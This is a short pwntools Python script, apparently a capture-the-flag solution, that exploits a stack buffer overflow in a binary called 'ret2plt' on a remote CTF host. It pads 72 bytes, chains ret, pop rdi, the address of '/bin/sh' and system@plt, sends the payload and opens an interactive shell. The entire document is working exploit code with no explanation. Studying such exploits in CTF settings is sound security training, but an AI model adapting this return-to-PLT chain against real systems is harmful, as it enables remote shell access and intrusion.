#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./ret2plt', checksec=False)

OFFSET_TO_RIP = 72

p = remote('offsec.m0lecon.it',13535)

pop_rdi = elf.sym.pop_rdi_ret
binsh = next(elf.search(b'/bin/sh\x00'))
ret = ROP(elf).find_gadget(['ret']).address

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret),
    p64(pop_rdi),
    p64(binsh),
    p64(elf.plt.system),
)

p.recvuntil(b'order?\n')
p.send(payload)
p.interactive()
